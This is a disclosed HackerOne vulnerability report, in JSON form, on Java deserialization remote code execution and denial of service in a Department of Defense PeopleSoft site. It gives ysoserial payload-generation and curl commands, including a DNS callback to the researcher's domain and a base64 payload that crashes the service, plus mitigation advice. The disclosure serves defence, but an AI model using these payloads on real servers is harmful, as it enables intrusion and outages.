{
  "id": 329400,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjk0MDA=",
  "url": "https://hackerone.com/reports/329400",
  "title": "Remote Code Execution (RCE) in a DoD website",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2018-03-24T03:06:58.421Z",
  "submitted_at": "2018-03-24T03:06:58.421Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "joaomatosf",
    "url": "/joaomatosf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/146/816/bcf0f02fbb0a5629f13d893f184c2d982cfaeadf_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2017-10366"
  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-10-08T18:50:10.020Z",
  "bug_reporter_agreed_on_going_public_at": "2018-08-22T17:22:12.396Z",
  "team_member_agreed_on_going_public_at": "2019-10-08T18:50:09.927Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "SUMMARY:\n====================\n\nThis report describes a vulnerability similar to that described in my other reports #329376, #329397, #329399\n\nThe DoD **`https://████/psc/EXPROD/`** Web System uses the Oracle PeopleSoft platform which is vulnerable to Remote Code Execution (RCE) and Denial of Service Attacks (DoS) over a Java Object Deserialization (CWE-502) in the “monitor” service. Thus an attacker can generate and send malicious java objects of special types to your system and achieve arbitrary effects (such as RCE os DoS) during their deserialization (the objects are deserialized by readObject() method without any type of validation). This is related to CVE-2017-10366 [1].\n\nPROOF OF CONCEPT\n====================\n\nFor PoC I sent a special serialized java object in order to force the vulnerable server to perform a DNS Lookup for a domain controlled by me (dod_test.jexboss.info). In this way, if the code is executed successfully by the DoD server I will receive a DNS query from DoD and see it in the logs of my BIND daemon (the vulnerable DoD server will perform a local DNS query for dod_test.jexboss.info and the local DNS will try to query the authoritative nameserver for the jexboss.info domain (ns1.jexboss.info), which is mine).\n\nFor more details about this payload used, see [2].\n\n**Attached is a video detailing the PoC.**\n\n**Generating the payload:** for generate the payload I used the tool ysoserial.\n```\n$ git clone https://github.com/frohoff/ysoserial.git\n$ cd ysoserial\n$ mvn clean package –DskipTests\n$ cd target\n$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://dod_test.jexboss.info > payload\n```\n\n**Sending the payload to a vulnerable server:**\n`curl https://████/psc/EXPROD/ --data-binary`@payload`-k`\n\nAfter sending the payload to the DoD server, the code was successfully executed and I received the DNS query on my BIND server, as can be seen in the log record below.\n\t\n**BIND logs:**\n```\n23-Mar-2018 18:42:26.332 queries: info: client ████#8059: query: dod_test.jexboss.info IN A -ED (10.0.1.202)\n```\n\n**Denial Of Service (DoS)**\n\nThis vulnerability also allows denial of service attacks, but I can not perform this test because it puts the availability of your service at risk. If you want to validate this, use the following PoC:\n\n**Generating payload for Denial of Service (DoS)[3]:**\n```\necho -n \"rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3\" | base64 -d > payload_dos\n```\n\n**Sending:**\n`curl https://████/psc/EXPROD/ --data-binary`@payload_dos`-k`\n\nThis will make your service stop immediately and show the following error in the logs:\n```Exception in thread \"Thread-2\" java.lang.OutOfMemoryError: Java heap space```\n\nMITIGATION\n====================\n\nThe best way to mitigate deserialization vulnerabilities is by not deserializing data received from users. In this particular case, any requests from the internet to the path **/monitor** should be rejected/blocked! \nAlso, it is important to note that updating libraries used by attackers as Gadgets (such as commonsCollections) is not enough to protect against deserialization attacks, since new gadgets are discovered and published frequently. So, blocking the monitor service is best suited for this case!\n\nREFERENCES:\n====================\n[1] - CVE-2017-10366. Link: https://nvd.nist.gov/vuln/detail/CVE-2017-10366\n[2] - Triggering a DNS lookup using Java Deserialization. Link: https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/\n[3] - Java Deserialization DoS – payloads. Link: http://topolik-at-work.blogspot.com.br/2016/04/java-deserialization-dos-payloads.html\n\nBest Regards, \nJoão Filho Matos Figueiredo, @joaomatosf\n\n## Impact\n\nThis vulnerability allows:\n1) Remote Code Execution (**RCE**)\n2) Denial of Service (DoS)",
  "weakness": {
    "id": 52,
    "name": "Deserialization of Untrusted Data"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 4,
  "voters": [
    "brodie_codie",
    "cryptographer",
    "armansameer",
    "a1000tonjustin0"
  ],
  "severity": {
    "rating": "critical",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
